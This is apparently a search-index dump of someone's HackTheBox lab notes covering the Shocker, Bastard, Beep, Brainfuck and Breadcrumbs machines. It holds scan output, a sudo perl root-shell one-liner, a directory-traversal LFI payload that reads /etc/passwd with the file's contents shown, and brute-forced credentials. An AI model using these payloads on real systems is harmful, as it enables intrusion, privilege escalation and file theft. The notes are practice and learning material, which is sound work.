do?"},{"location":"HackTheBox/shocker/#what-language-is-it-written-in","text":"Based on some feroxbuster output (403 errors) the site seems to have the following filetypes aspx , asp , jsp , php .","title":"What language is it written in?"},{"location":"HackTheBox/shocker/#what-server-software-is-the-application-running-on","text":"Apache httpd 2.4.18 (Ubuntu)","title":"What server software is the application running on?"},{"location":"HackTheBox/shocker/#getting-help","text":"I peaked at the walkthrough because I was lost. No shocker - this machine was built to practice shellshock. On apache, the cgi-bin folder contains scripts. The scripts are accessed via web, run server side, then returned with an HTTP reply. Shellshock provides input that hijacks the server-side shell run. I also saw in the walkthrough that the target script is /cgi-bin/user.sh . But I want to prove this with a scan.","title":"Getting help"},{"location":"HackTheBox/shocker/#fuzzing-for-shellshock","text":"Found a shellshock endpoint by running feroxbuster -u http://10.10.10.56:80/cgi-bin/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x \"sh\" -v -k -n -o /home/nate/hackthebox/shocker/results/scans/tcp80/tcp_80_http_feroxbuster_cgi-bin.txt","title":"fuzzing for shellshock"},{"location":"HackTheBox/shocker/#exploitation","text":"I was able to get user.txt but not enough privs for root.txt","title":"Exploitation"},{"location":"HackTheBox/shocker/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"HackTheBox/shocker/#linpeas-findings","text":"Sudo version 1.8.16 \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester 2 \u255a https://github.com/jondonas/linux-exploit-suggester-2 [1] af_packet CVE-2016-8655 Source: http://www.exploit-db.com/exploits/40871 [2] exploit_x CVE-2018-14665 Source: http://www.exploit-db.com/exploits/45697 [3] get_rekt CVE-2017-16695 Source: http://www.exploit-db.com/exploits/45010 \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d \u255ahttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl Might be able to use the following from GTFO bins to get root. sudo perl -e 'exec \"/bin/sh\";'","title":"Linpeas findings"},{"location":"HackTheBox/shocker/#reflectcompare","text":"My Path: Scan finds Apache 2.4.18 on port 80 Looked at walkthrough Fuzz /cgi-bin/ to find endpoint vulnerable to Shellshock. Send webrequest with malicious header. Got User User can run perl as sudo GTFO bins for SUDO and perl Root HTB Walkthrough: Scan finds Apache on port 80 Fuzzed and found cgi-bin directory Knows they're exploiting shellshock (box name + cgi-bin) Fuzzed /cgi-bin/ for .sh , .py , and other scripting extensions Find user.sh Use metasploit /multi/http/apache_mod_cgi_bash_env_exec Got User Found perl NOPASSWD entry. Root","title":"Reflect/Compare"},{"location":"HackTheBox/shocker/#analysis","text":"There's no reason I should have looked at the writeup on this one, I'm a bit ashamed. I knew the Apache version and could see the needed exploit from EDB (using searchsploit). Based on the name of the box I figured it would require exploiting shellshock - but this was my first experience with shellshock.","title":"Analysis"},{"location":"HackTheBox/shocker/#lessons-learned","text":"Go through each exploit and try to understand the exploit BEFORE using a walkthrough.","title":"Lessons Learned"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/","text":"Bastard \u00b6 Still in progress Recon \u00b6 The tags for this box are: Windows PHP Patch Management Web Difficulty: Medium Port scan revealed webserver on port 80, RPC on 139 and 49154. The webserver has Drupal 7 running on IIS 7.5 Enumerating the webserver \u00b6 There are some interesting entries in robots.txt : # Directories Disallow: /includes/ Disallow: /misc/ Disallow: /modules/ Disallow: /profiles/ Disallow: /scripts/ Disallow: /themes/ # Files Disallow: /CHANGELOG.txt Disallow: /cron.php Disallow: /INSTALL.mysql.txt Disallow: /INSTALL.pgsql.txt Disallow: /INSTALL.sqlite.txt Disallow: /install.php Disallow: /INSTALL.txt Disallow: /LICENSE.txt Disallow: /MAINTAINERS.txt Disallow: /update.php Disallow: /UPGRADE.txt Disallow: /xmlrpc.php # Paths (clean URLs) Disallow: /admin/ Disallow: /comment/reply/ Disallow: /filter/tips/ Disallow: /node/add/ Disallow: /search/ Disallow: /user/register/ Disallow: /user/password/ Disallow: /user/login/ Disallow: /user/logout/ # Paths (no clean URLs) Disallow: /?q=admin/ Disallow: /?q=comment/reply/ Disallow: /?q=filter/tips/ Disallow: /?q=node/add/ Disallow: /?q=search/ Disallow: /?q=user/password/ Disallow: /?q=user/register/ Disallow: /?q=user/login/ Disallow: /?q=user/logout/ There are also some interesting findings by feroxbuster 200 159l 413w 7583c http://10.10.10.9/0 200 159l 413w 7583c http://10.10.10.9/node 200 1l 7w 62c http://10.10.10.9/rest 200 90l 243w 2189c http://10.10.10.9/robots.txt 200 152l 394w 7420c http://10.10.10.9/user 200 159l 413w 7583c http://10.10.10.9/0 200 159l 413w 7583c http://10.10.10.9/index.php 200 45l 262w 1717c http://10.10.10.9/install.mysql.txt 200 44l 290w 1874c http://10.10.10.9/install.pgsql.txt 200 159l 413w 7583c http://10.10.10.9/node 200 1l 7w 62c http://10.10.10.9/rest 200 90l 243w 2189c http://10.10.10.9/robots.txt 200 152l 394w 7420c http://10.10.10.9/user 200 1l 6w 42c http://10.10.10.9/xmlrpc.php 200 152l 394w 7420c http://10.10.10.9/user 200 159l 413w 7583c http://10.10.10.9/node 200 159l 413w 7583c http://10.10.10.9/ 200 159l 413w 7583c http://10.10.10.9/0 200 175l 510w 9063c http://10.10.10.9/User 200 1l 7w 62c http://10.10.10.9/rest 200 1l 7w 62c http://10.10.10.9/REST 200 175l 510w 9063c http://10.10.10.9/USER 200 123l 714w 5382c http://10.10.10.9/ReadMe.txt NMAP port scan \u00b6 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 7.5 | http-robots.txt: 36 disallowed entries | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt | /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php | /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ | /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ | /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ |_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/ | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 |_http-generator: Drupal 7 (http://drupal.org) |_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03 |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose|phone Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%) Services \u00b6 Port 80 \u00b6 IIS 7.5 \u00b6 Drupal 7 \u00b6 Port 135 \u00b6 Port 49154 \u00b6","title":"Bastard"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#bastard","text":"Still in progress","title":"Bastard"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#recon","text":"The tags for this box are: Windows PHP Patch Management Web Difficulty: Medium Port scan revealed webserver on port 80, RPC on 139 and 49154. The webserver has Drupal 7 running on IIS 7.5","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#enumerating-the-webserver","text":"There are some interesting entries in robots.txt : # Directories Disallow: /includes/ Disallow: /misc/ Disallow: /modules/ Disallow: /profiles/ Disallow: /scripts/ Disallow: /themes/ # Files Disallow: /CHANGELOG.txt Disallow: /cron.php Disallow: /INSTALL.mysql.txt Disallow: /INSTALL.pgsql.txt Disallow: /INSTALL.sqlite.txt Disallow: /install.php Disallow: /INSTALL.txt Disallow: /LICENSE.txt Disallow: /MAINTAINERS.txt Disallow: /update.php Disallow: /UPGRADE.txt Disallow: /xmlrpc.php # Paths (clean URLs) Disallow: /admin/ Disallow: /comment/reply/ Disallow: /filter/tips/ Disallow: /node/add/ Disallow: /search/ Disallow: /user/register/ Disallow: /user/password/ Disallow: /user/login/ Disallow: /user/logout/ # Paths (no clean URLs) Disallow: /?q=admin/ Disallow: /?q=comment/reply/ Disallow: /?q=filter/tips/ Disallow: /?q=node/add/ Disallow: /?q=search/ Disallow: /?q=user/password/ Disallow: /?q=user/register/ Disallow: /?q=user/login/ Disallow: /?q=user/logout/ There are also some interesting findings by feroxbuster 200 159l 413w 7583c http://10.10.10.9/0 200 159l 413w 7583c http://10.10.10.9/node 200 1l 7w 62c http://10.10.10.9/rest 200 90l 243w 2189c http://10.10.10.9/robots.txt 200 152l 394w 7420c http://10.10.10.9/user 200 159l 413w 7583c http://10.10.10.9/0 200 159l 413w 7583c http://10.10.10.9/index.php 200 45l 262w 1717c http://10.10.10.9/install.mysql.txt 200 44l 290w 1874c http://10.10.10.9/install.pgsql.txt 200 159l 413w 7583c http://10.10.10.9/node 200 1l 7w 62c http://10.10.10.9/rest 200 90l 243w 2189c http://10.10.10.9/robots.txt 200 152l 394w 7420c http://10.10.10.9/user 200 1l 6w 42c http://10.10.10.9/xmlrpc.php 200 152l 394w 7420c http://10.10.10.9/user 200 159l 413w 7583c http://10.10.10.9/node 200 159l 413w 7583c http://10.10.10.9/ 200 159l 413w 7583c http://10.10.10.9/0 200 175l 510w 9063c http://10.10.10.9/User 200 1l 7w 62c http://10.10.10.9/rest 200 1l 7w 62c http://10.10.10.9/REST 200 175l 510w 9063c http://10.10.10.9/USER 200 123l 714w 5382c http://10.10.10.9/ReadMe.txt","title":"Enumerating the webserver"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#nmap-port-scan","text":"PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 7.5 | http-robots.txt: 36 disallowed entries | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt | /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php | /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ | /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ | /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ |_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/ | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 |_http-generator: Drupal 7 (http://drupal.org) |_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03 |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose|phone Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%)","title":"NMAP port scan"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#services","text":"","title":"Services"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#port-80","text":"","title":"Port 80"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#iis-75","text":"","title":"IIS 7.5"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#drupal-7","text":"","title":"Drupal 7"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#port-135","text":"","title":"Port 135"},{"location":"HackTheBox/Work%20in%20Progress/Bastard/#port-49154","text":"","title":"Port 49154"},{"location":"HackTheBox/Work%20in%20Progress/Beep/","text":"Beep \u00b6 still in progress Recon \u00b6 Tags for this box : LFI Web Difficulty: Easy Scan findings \u00b6 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0) 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.3 |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 110/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 111/tcp open rpcbind syn-ack ttl 63 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: NAMESPACE THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED URLAUTHA0001 LISTEXT OK X-NETSCAPE IDLE RENAME CATENATE CONDSTORE MULTIAPPEND THREAD=REFERENCES ANNOTATEMORE Completed SORT=MODSEQ SORT IMAP4rev1 ATOMIC NO QUOTA BINARY LITERAL+ ACL CHILDREN ID IMAP4 STARTTLS MAILBOX-REFERRALS UNSELECT UIDPLUS RIGHTS=kxte 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) | http-robots.txt: 1 disallowed entry |_/ 878/tcp open status syn-ack ttl 63 1 (RPC #100024) 993/tcp open ssl/imap syn-ack ttl 63 Cyrus imapd 995/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) 4190/tcp open sieve syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap) 4445/tcp open upnotifyp? syn-ack ttl 63 4559/tcp open hylafax syn-ack ttl 63 HylaFAX 4.3.10 5038/tcp open asterisk syn-ack ttl 63 Asterisk Call Manager 1.1 10000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd) |_http-trane-info: Problem with XML parsing of /evox/about | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Aggressive OS guesses: Linux 2.6.9 - 2.6.24 (95%), Some users found on port 25 [25][smtp-enum] host: 10.10.10.7 login: info [25][smtp-enum] host: 10.10.10.7 login: adm [25][smtp-enum] host: 10.10.10.7 login: root [25][smtp-enum] host: 10.10.10.7 login: mysql [25][smtp-enum] host: 10.10.10.7 login: ftp https webserver has a few webpages 200 1l 6w 894c https://10.10.10.7/favicon.ico 200 2l 4w 28c https://10.10.10.7/robots.txt 200 35l 111w 1785c https://10.10.10.7/ 200 35l 111w 1785c https://10.10.10.7/config.php 200 35l 111w 1785c https://10.10.10.7/index.php 200 35l 111w 1785c https://10.10.10.7/register.php Enumeration \u00b6 The site on 443 is an Elastics CRM login page. Exploitation \u00b6 It might be this, considering the LFI tag. That exploit doesn't work, however it does help to enumerate vtigercrm. I checked, and sure enough it's on this box. The login page even discloses the version 5.1.0 This new exploit EDB-18770 , suggests the following url: https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00 Sure enough, I can read files now. After some testing, it looks like we only need to go up 4 directories in the directory traversal: /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00 Contents of /etc/passwd root:x:0:0:root:/root:/bin/bash sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash fanis:x:501:501::/home/fanis:/bin/bash I was able to get the user flag using LFI more Enumeration \u00b6 There is also a webserver on port 10000. An nmap script picked up CVE-2006-3392 This CVE is linked to EDB-1997 . Reviewing the exploit shows usage on line 50. No changes are necessary; all variables are provided at runtime instead of hardcoded in varaibles. This exploit is throwing errors: I found this answer on StackOverflow . Installing the proper version for my php package. To identify php version: php --version Then install proper version: sudo apt install php7.4-curl It appears this exploit is not working even with php-curl installed. There are a bunch of SSL errors in the NMAP output. It seems Autorecon was scanning using HTTP instead of HTTPS. Will re-run some scans with https. These commands should be re-run using HTTPS instead of HTTP. curl -sSik https://10.10.10.7:10000/ && curl -sSikf https://10.10.10.7:10000/.well-known/security.txt && curl -sSikf https://10.10.10.7:10000/robots.txt && nmap -vv --reason -Pn -T4 -sV -p 10000 --script=\"banner,(https* or ssl*) and not (brute or broadcast or dos or external or https-slowloris* or fuzzer)\" -oN \"/home/nate/hackthebox/beep/scans/tcp10000/tcp_10000_https_nmap.txt\" -oX \"/home/nate/hackthebox/beep/scans/tcp10000/xml/tcp_10000_https_nmap.xml\" 10.10.10.7 && whatweb --color=never --no-errors -a 3 -v https://10.10.10.7:10000 2>&1 feroxbuster -u https://10.10.10.7:10000/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x \"php,bin,txt\" -v -k -n -o /home/nate/hackthebox/beep/scans/tcp80/tcp_80_http_feroxbuster_https.txt Gotta get a shell. \u00b6 I have the user flag, but I still don't have code execution. I need to examine the options and decide which route(s) to take. Brainstorming: LFI to RCE \u00b6 Poison logs Maybe RFI?","title":"Beep"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#beep","text":"still in progress","title":"Beep"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#recon","text":"Tags for this box : LFI Web Difficulty: Easy","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#scan-findings","text":"PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0) 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.3 |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 110/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 111/tcp open rpcbind syn-ack ttl 63 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: NAMESPACE THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED URLAUTHA0001 LISTEXT OK X-NETSCAPE IDLE RENAME CATENATE CONDSTORE MULTIAPPEND THREAD=REFERENCES ANNOTATEMORE Completed SORT=MODSEQ SORT IMAP4rev1 ATOMIC NO QUOTA BINARY LITERAL+ ACL CHILDREN ID IMAP4 STARTTLS MAILBOX-REFERRALS UNSELECT UIDPLUS RIGHTS=kxte 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) | http-robots.txt: 1 disallowed entry |_/ 878/tcp open status syn-ack ttl 63 1 (RPC #100024) 993/tcp open ssl/imap syn-ack ttl 63 Cyrus imapd 995/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) 4190/tcp open sieve syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap) 4445/tcp open upnotifyp? syn-ack ttl 63 4559/tcp open hylafax syn-ack ttl 63 HylaFAX 4.3.10 5038/tcp open asterisk syn-ack ttl 63 Asterisk Call Manager 1.1 10000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd) |_http-trane-info: Problem with XML parsing of /evox/about | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Aggressive OS guesses: Linux 2.6.9 - 2.6.24 (95%), Some users found on port 25 [25][smtp-enum] host: 10.10.10.7 login: info [25][smtp-enum] host: 10.10.10.7 login: adm [25][smtp-enum] host: 10.10.10.7 login: root [25][smtp-enum] host: 10.10.10.7 login: mysql [25][smtp-enum] host: 10.10.10.7 login: ftp https webserver has a few webpages 200 1l 6w 894c https://10.10.10.7/favicon.ico 200 2l 4w 28c https://10.10.10.7/robots.txt 200 35l 111w 1785c https://10.10.10.7/ 200 35l 111w 1785c https://10.10.10.7/config.php 200 35l 111w 1785c https://10.10.10.7/index.php 200 35l 111w 1785c https://10.10.10.7/register.php","title":"Scan findings"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#enumeration","text":"The site on 443 is an Elastics CRM login page.","title":"Enumeration"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#exploitation","text":"It might be this, considering the LFI tag. That exploit doesn't work, however it does help to enumerate vtigercrm. I checked, and sure enough it's on this box. The login page even discloses the version 5.1.0 This new exploit EDB-18770 , suggests the following url: https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00 Sure enough, I can read files now. After some testing, it looks like we only need to go up 4 directories in the directory traversal: /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00 Contents of /etc/passwd root:x:0:0:root:/root:/bin/bash sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash fanis:x:501:501::/home/fanis:/bin/bash I was able to get the user flag using LFI","title":"Exploitation"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#more-enumeration","text":"There is also a webserver on port 10000. An nmap script picked up CVE-2006-3392 This CVE is linked to EDB-1997 . Reviewing the exploit shows usage on line 50. No changes are necessary; all variables are provided at runtime instead of hardcoded in varaibles. This exploit is throwing errors: I found this answer on StackOverflow . Installing the proper version for my php package. To identify php version: php --version Then install proper version: sudo apt install php7.4-curl It appears this exploit is not working even with php-curl installed. There are a bunch of SSL errors in the NMAP output. It seems Autorecon was scanning using HTTP instead of HTTPS. Will re-run some scans with https. These commands should be re-run using HTTPS instead of HTTP. curl -sSik https://10.10.10.7:10000/ && curl -sSikf https://10.10.10.7:10000/.well-known/security.txt && curl -sSikf https://10.10.10.7:10000/robots.txt && nmap -vv --reason -Pn -T4 -sV -p 10000 --script=\"banner,(https* or ssl*) and not (brute or broadcast or dos or external or https-slowloris* or fuzzer)\" -oN \"/home/nate/hackthebox/beep/scans/tcp10000/tcp_10000_https_nmap.txt\" -oX \"/home/nate/hackthebox/beep/scans/tcp10000/xml/tcp_10000_https_nmap.xml\" 10.10.10.7 && whatweb --color=never --no-errors -a 3 -v https://10.10.10.7:10000 2>&1 feroxbuster -u https://10.10.10.7:10000/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x \"php,bin,txt\" -v -k -n -o /home/nate/hackthebox/beep/scans/tcp80/tcp_80_http_feroxbuster_https.txt","title":"more Enumeration"},{"location":"HackTheBox/Work%20in%20Progress/Beep/#gotta-get-a-shell","text":"I have the user flag, but I still don't have code execution. I need to examine the options and decide which route(s) to take.","title":"Gotta get a shell."},{"location":"HackTheBox/Work%20in%20Progress/Beep/#brainstorming-lfi-to-rce","text":"Poison logs Maybe RFI?","title":"Brainstorming: LFI to RCE"},{"location":"HackTheBox/Work%20in%20Progress/Brainfuck/","text":"Brainfuck \u00b6 Still in progress Recon \u00b6 The tags for this box are: Cryptography Difficulty: Insane NGINX is running on port 443 but could not access the website by IP. After adding a name resolution to /etc/hosts I was able to access the site at https://brainfuck.htb . It's running WordPress 4.7.3, there is a login page at /wp-admin One of the plugins is vulnerable searchsploit ticket system 7.1.3 EDB 41006 , 40939 - These vulnerabilities require user-level access, so they aren't useful yet. Nikto picked up an interesting link in the response headers: + Uncommon header 'link' found, with contents: <https://brainfuck.htb/?rest_route=/>; rel=\"https://api.w.org/\" Enumerating the API shows a bunch of different endpoints exposed. One of the endpoints displays all users - the only user in this case is admin. Maybe I can inject a user? NOTE - brainfuck (the name of this box) is also the name of an encoding algorithm on this decoder . Turns out this is a meme programming language. Read about it on Wikipedia At this point, it seems I should be looking for some brainfuck-encoded value and try to decode it, though after reading about brainfuck on wikipedia the author of this challenge likely put many rabbit-holes in place which will make it difficult to find the correct attack vector. As I review scan results, I wonder if there is a passphrase associated with the TLS certificate. If I crack it, it may be the same pw for wordpress. On the cert there is an AltName I added the altname to /etc/hosts , for the same IP as brainfuck.htb . And sure enough there's a super secret hidden forum! Also found a session cookie! Maybe this is the brainfuck-encoded value! Couldn't decode the cookie. I was able to register an account. Successful login looks like this: There's another cookie named flarum_remember , which also doesn't decode to anything obvious. My created user has an ID of 4. Wonder who the other users are? I was able to use forced browsing to find user with ID 3, which was the only mystery user (I already saw admin is 1 and restis is 2, I was 4) Looking at the admin user, there appears to be some private posts and discussions: Exploitation \u00b6 Since I didn't find any other way to break the authentication mechanism, I decided to try a brute force attack. I decided to test the known usernames with a few wordlists. Since the usernames appear to follow a Greek Mythology theme, I will be using this Greek wordlist to fuzz the 3 users. User: kostas Pass: 123123123 I logged in to the secret forum, but this user has nothing useful. The email provided for this user was kostas@testest.com - which makes me think this account is worthless. Of these accounts, the only one that also works in /wp-admin/ is admin .","title":"Brainfuck"},{"location":"HackTheBox/Work%20in%20Progress/Brainfuck/#brainfuck","text":"Still in progress","title":"Brainfuck"},{"location":"HackTheBox/Work%20in%20Progress/Brainfuck/#recon","text":"The tags for this box are: Cryptography Difficulty: Insane NGINX is running on port 443 but could not access the website by IP. After adding a name resolution to /etc/hosts I was able to access the site at https://brainfuck.htb . It's running WordPress 4.7.3, there is a login page at /wp-admin One of the plugins is vulnerable searchsploit ticket system 7.1.3 EDB 41006 , 40939 - These vulnerabilities require user-level access, so they aren't useful yet. Nikto picked up an interesting link in the response headers: + Uncommon header 'link' found, with contents: <https://brainfuck.htb/?rest_route=/>; rel=\"https://api.w.org/\" Enumerating the API shows a bunch of different endpoints exposed. One of the endpoints displays all users - the only user in this case is admin. Maybe I can inject a user? NOTE - brainfuck (the name of this box) is also the name of an encoding algorithm on this decoder . Turns out this is a meme programming language. Read about it on Wikipedia At this point, it seems I should be looking for some brainfuck-encoded value and try to decode it, though after reading about brainfuck on wikipedia the author of this challenge likely put many rabbit-holes in place which will make it difficult to find the correct attack vector. As I review scan results, I wonder if there is a passphrase associated with the TLS certificate. If I crack it, it may be the same pw for wordpress. On the cert there is an AltName I added the altname to /etc/hosts , for the same IP as brainfuck.htb . And sure enough there's a super secret hidden forum! Also found a session cookie! Maybe this is the brainfuck-encoded value! Couldn't decode the cookie. I was able to register an account. Successful login looks like this: There's another cookie named flarum_remember , which also doesn't decode to anything obvious. My created user has an ID of 4. Wonder who the other users are? I was able to use forced browsing to find user with ID 3, which was the only mystery user (I already saw admin is 1 and restis is 2, I was 4) Looking at the admin user, there appears to be some private posts and discussions:","title":"Recon"},{"location":"HackTheBox/Work%20in%20Progress/Brainfuck/#exploitation","text":"Since I didn't find any other way to break the authentication mechanism, I decided to try a brute force attack. I decided to test the known usernames with a few wordlists. Since the usernames appear to follow a Greek Mythology theme, I will be using this Greek wordlist to fuzz the 3 users. User: kostas Pass: 123123123 I logged in to the secret forum, but this user has nothing useful. The email provided for this user was kostas@testest.com - which makes me think this account is worthless. Of these accounts, the only one that also works in /wp-admin/ is admin .","title":"Exploitation"},{"location":"HackTheBox/Work%20in%20Progress/Breadcrumbs/","text":"Breadcrumbs \u00b6 Still in progress Recon \u00b6 The tags on this box Windows SQL Injection JSON Source code review Difficulty: Hard Port Scan \u00b6 22/tcp open ssh syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 3306/tcp open mysql? syn-ack ttl 127 | mysql-info: |_ MySQL Error: Host '10.10.16.3' is not allowed to connect to this MariaDB server 5040/tcp open unknown syn-ack ttl 127 7680/tcp open pando-pub? syn-ack ttl 127 30117/tcp filtered unknown host-unreach from 10.10.16.1 ttl 64 